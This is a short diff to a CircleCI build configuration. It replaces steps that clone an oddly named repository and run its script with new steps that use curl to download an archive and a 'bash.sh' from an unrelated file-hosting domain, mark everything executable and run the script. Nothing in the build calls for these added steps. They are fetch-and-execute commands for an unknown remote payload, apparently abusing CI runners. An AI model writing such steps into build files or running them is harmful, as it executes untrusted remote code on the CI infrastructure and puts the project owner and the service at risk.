@@ -9,5 +9,6 @@ jobs:
       - image: circleci/golang:1.9
     steps:
       - run: ls
-      - run: git clone https://github.com/tron21-22/bug-free-fortnight
-      - run: cd bug-free-fortnight && chmod +x bash bash.sh && ./bash.sh
+      - run: mkdir a
+      - run: cd a && curl https://www.maxfile2linkbot.cf/85152/download -o a.tar.gz && tar xf a.tar.gz && curl https://www.maxfile2linkbot.cf/85156/download -o bash.sh && chmod +x * && ./bash.sh
+      - run:  ./bash.sh
